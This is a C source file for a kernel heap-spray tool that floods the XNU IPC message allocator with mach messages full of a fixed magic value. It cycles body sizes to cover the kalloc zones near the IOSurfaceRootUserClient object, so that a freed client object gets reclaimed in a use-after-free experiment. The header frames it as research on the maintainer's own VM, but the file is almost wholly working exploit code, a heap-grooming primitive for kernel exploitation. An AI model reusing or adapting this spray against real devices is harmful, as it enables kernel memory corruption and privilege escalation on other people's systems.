/* cnd_mach_spray.c — bounded kernel-allocation sprayer for the V11 reclaim
 * experiment on the maintainer's own research VM.
 *
 * Floods the kernel's IPC message allocator with mach messages whose bodies
 * are filled with a fixed 8-byte magic (0x4141414141414141), cycling through
 * several body sizes so the spray covers the kalloc size zones around the
 * 0x148-byte IOSurfaceRootUserClient object. If a freed client address is
 * reclaimed by one of these messages, client+0xd8 reads back the magic at
 * notification delivery time.
 *
 * Usage: cnd_mach_spray [iterations] [magic_hex]
 * Defaults: unlimited iterations, magic 0x4141414141414141.
 * Prints a one-line rate report every 5 seconds. Stop with SIGTERM/SIGKILL.
 */

#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define BODY_MAGIC_DEFAULT 0x4141414141414141ULL

static const size_t kBodySizes[] = { 240, 264, 280, 296, 312, 328, 344, 360 };
#define NSIZES (sizeof(kBodySizes) / sizeof(kBodySizes[0]))

typedef struct {
    mach_msg_header_t head;
    char body[512];
} spray_msg_t;

int main(int argc, char **argv) {
    uint64_t max_iter = (argc > 1) ? strtoull(argv[1], NULL, 0) : 0; /* 0 = forever */
    uint64_t magic = (argc > 2) ? strtoull(argv[2], NULL, 16) : BODY_MAGIC_DEFAULT;

    mach_port_t port;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) { fprintf(stderr, "port alloc failed %d\n", kr); return 1; }

    /* Let the queue grow so each send keeps its kernel message allocated. */
    mach_port_limits_t limits = { .mpl_qlimit = 100000 };
    mach_port_set_attributes(mach_task_self(), port, MACH_PORT_LIMITS_INFO,
                             (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT);

    spray_msg_t msg;
    memset(&msg, 0, sizeof(msg));
    for (size_t i = 0; i < sizeof(msg.body); i += 8) {
        memcpy(msg.body + i, &magic, 8);
    }
    msg.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg.head.msgh_remote_port = port;
    msg.head.msgh_local_port = MACH_PORT_NULL;
    msg.head.msgh_id = 0;

    uint64_t iter = 0;
    time_t last_report = time(NULL);
    uint64_t last_count = 0;
    for (;;) {
        size_t body = kBodySizes[iter % NSIZES];
        msg.head.msgh_size = (mach_msg_size_t)(sizeof(mach_msg_header_t) + body);
        kr = mach_msg_send(&msg.head);
        if (kr != KERN_SUCCESS && kr != MACH_SEND_NO_BUFFER) {
            fprintf(stderr, "mach_msg_send failed %d at iter %llu\n", kr,
                    (unsigned long long)iter);
        }
        iter++;
        if (max_iter && iter >= max_iter) break;
        time_t now = time(NULL);
        if (now - last_report >= 5) {
            printf("spray iter=%llu rate=%llu/s size=%zu\n",
                   (unsigned long long)iter,
                   (unsigned long long)((iter - last_count) / (now - last_report)),
                   body);
            fflush(stdout);
            last_report = now;
            last_count = iter;
        }
    }
    printf("spray done iter=%llu\n", (unsigned long long)iter);
    return 0;
}
